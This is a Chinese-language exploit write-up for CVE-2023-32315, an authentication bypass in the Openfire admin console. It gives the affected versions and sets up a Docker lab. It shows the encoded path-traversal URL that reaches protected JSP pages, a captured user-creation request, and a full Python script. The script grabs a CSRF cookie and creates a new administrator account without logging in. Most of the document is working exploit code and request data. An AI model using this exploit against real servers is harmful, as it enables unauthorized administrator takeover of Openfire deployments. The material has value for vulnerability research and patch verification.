| **漏洞名称**     | Openfire 控制台身份认证绕过漏洞 |
| ---------------- | ------------------------------- |
| **漏洞公开编号** | CVE-2023-32315                  |

***\*影响版本\****

3.10.0<=Openfire<4.6.8

4.7.0  <=Openfire<4.7.5

前往https://github.com/igniterealtime/Openfire/releases下载4.7.5与4.7.4版本进行对比



再结合nuclei已经公开的检测脚本



可以访问到该目录下的log


```
/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp #访问该地址下面的页面即证明漏洞存在
```



同目录下存在user-create.jsp文件，后续的管理员用户创建需要使用到这个文件.

然后使用docker搭建测试环境

```
docker pull nasqueron/openfire:4.7.1
sudo docker run --name openfire -d --restart=always \
>   --publish 9090:9090 --publish 5222:5222 --publish 7777:7777 \
>   --volume /srv/docker/openfire:/var/lib/openfire \
>   nasqueron/openfire:4.7.1
```

然后抓取创建用户的数据包

```
GET /user-create.jsp?csrf=LxXB94PM5RujGFt&username=admin3&name=admin3&email=admin3%40123.com&password=1234567&passwordConfirm=1234567&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1
Host: 10.19.71.129:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://10.19.71.129:9090/user-create.jsp
Cookie: JSESSIONID=node016jqkrnrfyv86d37wzxzlwklv17.node0; csrf=LxXB94PM5RujGFt
X-Forwarded-For: 1.2.3.4
Connection: close
Upgrade-Insecure-Requests: 1
```

编写exp 因为requests对url强制转义，这里使用HackRequests发送请求

```python
import HackRequests


def CVE_2023_32315(url):
    hack = HackRequests.hackRequests()
    host = url.split("://")[1]
    login_url = url + "/login.jsp"
    header = {
        "Host": host,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "close",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "DNT": "1",
        "X-Forwarded-For": "1.2.3.4",
        "Upgrade-Insecure-Requests": "1"
    }

    hh = hack.http(login_url, headers=header, proxy=('127.0.0.1', '8880'))
    csrf_cookie = hh.cookies['csrf']

    header2 = {
        "Host": host,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "close",
        "Cookie": f"JSESSIONID={hh.cookies['JSESSIONID']}; csrf={hh.cookies['csrf']}",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "DNT": "1",
        "X-Forwarded-For": "1.2.3.4",
        "Upgrade-Insecure-Requests": "1"
    }

    print(header2)
    exp_url = f"{url}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf_cookie}&username=admin4&name=admin4&email=admin4%40123.com&password=1234567&passwordConfirm=1234567&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"

    hhh = hack.http(exp_url, headers=header2, proxy=('127.0.0.1', '8880'))
    print(hhh.log.get("request"))
    print(hhh.log.get("response"))


CVE_2023_32315("http://10.19.71.129:9090")

```

